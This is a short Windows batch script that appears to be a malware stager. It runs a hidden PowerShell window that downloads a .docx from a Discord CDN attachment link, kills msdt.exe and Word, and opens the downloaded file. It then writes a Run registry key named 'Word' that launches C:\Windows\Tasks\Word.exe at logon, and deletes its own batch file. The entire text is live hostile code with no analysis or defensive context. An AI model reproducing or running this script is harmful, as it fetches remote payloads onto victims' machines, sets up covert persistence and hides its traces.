@echo off
%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/985363772216606750/986139705865293884/18561.docx -OutFile C:\\users\$env:USERNAME\Downloads\18561.docx ;taskkill /f /im msdt.exe ; taskkill /f /im WINWORD.EXE; Start-Process C:\\users\$env:USERNAME\Downloads\18561.docx ;reg add 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run' /V 'Word' /t REG_SZ /F /D 'C:\\Windows\\Tasks\\Word.exe'; rm C:\Windows\Tasks\c.bat;"